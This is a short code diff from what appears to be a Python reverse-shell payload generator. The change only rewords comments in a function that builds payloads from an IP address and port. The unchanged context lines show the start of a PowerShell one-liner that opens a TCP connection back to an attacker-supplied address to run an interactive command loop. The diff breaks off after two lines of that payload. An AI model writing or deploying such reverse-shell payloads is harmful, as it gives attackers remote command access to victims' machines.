@@ -28,9 +28,8 @@ def _b64_payload(ip: str, port: int) -> str:
 
 
 def _build_payloads(ip: str, port: int) -> dict[str, str]:
-    # Interactive cmd-like loop, kept as a single valid PowerShell one-liner.
-    # Statements are separated with ';' (never before an 'else'); PowerShell
-    # quoting (backtick-escaped quotes for the inner `cmd /c` calls) is preserved.
+    # One valid PowerShell one-liner: ';' between statements, never before an
+    # 'else', and backtick-escaped quotes for the inner `cmd /c` calls.
     _CMD_PAYLOAD = (
         f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});"
         "$stream=$client.GetStream();"
